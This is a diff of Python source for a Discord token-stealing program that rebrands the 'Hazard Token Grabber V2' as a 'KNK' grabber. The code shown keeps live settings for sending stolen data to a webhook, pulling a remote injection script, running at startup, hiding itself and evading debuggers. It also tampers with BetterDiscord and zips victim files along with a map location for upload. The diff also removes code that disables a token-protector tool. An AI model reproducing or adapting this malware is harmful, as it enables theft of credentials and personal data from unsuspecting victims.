@@ -20,22 +20,13 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 config = {
-    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
-    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted 
     'webhook': "WEBHOOK_HERE",
-    #ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
-    'webhook_protector_key': "KEY_HERE",
-    # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
-    # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
-    # if you want the file to run at startup
     'startup': True,
-    # if you want the file to hide itself after run
     'hide_self': True,
-    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
-    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
+    
     'blackListedPrograms':
     [
         "httpdebuggerui",
@@ -113,7 +104,7 @@ class functions(object):
         return config.get(e)
 
 
-class Hazard_Token_Grabber_V2(functions):
+class kroniker_tokengrabber(functions):
     def __init__(self):
         self.webhook = self.fetchConf('webhook')
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -233,51 +224,13 @@ class Hazard_Token_Grabber_V2(functions):
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
 
-    async def bypassTokenProtector(self):
-        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
-        tp = f"{self.roaming}\\DiscordTokenProtector\\"
-        if not os.path.exists(tp):
-            return
-        config = tp+"config.json"
-
-        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
-            try:
-                os.remove(tp+i)
-            except FileNotFoundError:
-                pass
-        if os.path.exists(config):
-            with open(config, errors="ignore") as f:
-                try:
-                    item = json.load(f)
-                except json.decoder.JSONDecodeError:
-                    return
-                item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
-                item['auto_start'] = False
-                item['auto_start_discord'] = False
-                item['integrity'] = False
-                item['integrity_allowbetterdiscord'] = False
-                item['integrity_checkexecutable'] = False
-                item['integrity_checkhash'] = False
-                item['integrity_checkmodule'] = False
-                item['integrity_checkscripts'] = False
-                item['integrity_checkresource'] = False
-                item['integrity_redownloadhashes'] = False
-                item['iterations_iv'] = 364
-                item['iterations_key'] = 457
-                item['version'] = 69420
-            with open(config, 'w') as f:
-                json.dump(item, f, indent=2, sort_keys=True)
-            with open(config, 'a') as f:
-                f.write(
-                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")
-
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         if os.path.exists(bd):
             x = "api/webhooks"
             with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                 txt = f.read()
-                content = txt.replace(x, 'RdimoTheGoat')
+                content = txt.replace(x, 'KNK-CREW')
             with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                 f.write(content)
 
@@ -489,10 +442,10 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                                "👑・TokenGabber By KNK Team・https://github.com/KRONIKER-KNK/TokenGrabber/main.py\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                                x+"\n\n👑・TokenGabber By KNK Team・https://github.com/KRONIKER-KNK/TokenGrabber/main.py")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -515,7 +468,7 @@ class Hazard_Token_Grabber_V2(functions):
         googlemap = "https://www.google.com/maps/search/google+map++" + loc
 
         _zipfile = os.path.join(
-            self.appdata, f'Hazard.V2-[{Victim}].zip')
+            self.appdata, f'tokengrab-[{Victim}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -532,13 +485,13 @@ class Hazard_Token_Grabber_V2(functions):
             tokens += f'{tkn}\n\n'
         fileCount = f"{len(files)} Files Found: "
         embed = {
-            'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
+            'avatar_url': 'https://www.zupimages.net/up/22/21/qsc0.png',
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
-                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
-                        'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
+                        'name': f'*{Victim}* Just run KNK Token Grabber',
+                        'url': 'https://github.com/KRONIKER-KNK/TokenGrabber',
+                        'icon_url': 'https://www.zupimages.net/up/22/21/qsc0.png'
                     },
                     'color': 16119101,
                     'description': f'[Google Maps Location]({googlemap})',
@@ -681,4 +634,4 @@ class AntiDebug(functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(Hazard_Token_Grabber_V2().init())
+    asyncio.run(kroniker_tokengrabber().init())
